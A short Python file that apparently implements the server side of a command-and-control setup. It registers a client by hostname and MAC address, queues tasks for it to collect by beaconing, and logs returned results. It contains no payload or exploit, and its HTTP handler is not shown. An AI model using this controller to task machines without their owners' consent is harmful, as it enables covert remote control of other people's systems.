from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from collections import deque
import uuid
import json

PORT = 8000

class Server:
    def __init__(self):
        self.client = None

    def identify(self, hostname, mac):
        self.client = {
            "hostname": hostname,
            "mac": mac,
            "tasks": deque(),
            "results": {}
        }

        print(f"client connected: {hostname} / {mac}")
        return {"status": "ok"}
        
    def beacon(self):
        if not self.client:
            raise Exception("no client")

        task = self.dequeue()
        return {"task": task} if task else {}
    
    def enqueue(self, task):
        if not self.client:
            raise Exception("no client")

        self.client["tasks"].append(task)

    def dequeue(self):
        queue = self.client["tasks"]
        return queue.popleft() if queue else None
    
    def create_task(self, method, params=None):
        return {
            "id": str(uuid.uuid4()),
            "type": "action",
            "method": method,
            "params": params or {}
        }

    def send_task(self, method, params=None):
        if not self.client:
            print("no client connected")
            return

        self.enqueue(self.create_task(method, params))
    
    def task_result(self, task_id, output, status="ok"):
        self.client["results"][task_id] = {
            "output": output,
            "status": status
        }

        print(f"[RESULT] {task_id} [{status}] -> {output}")
        return {"status": "received"}
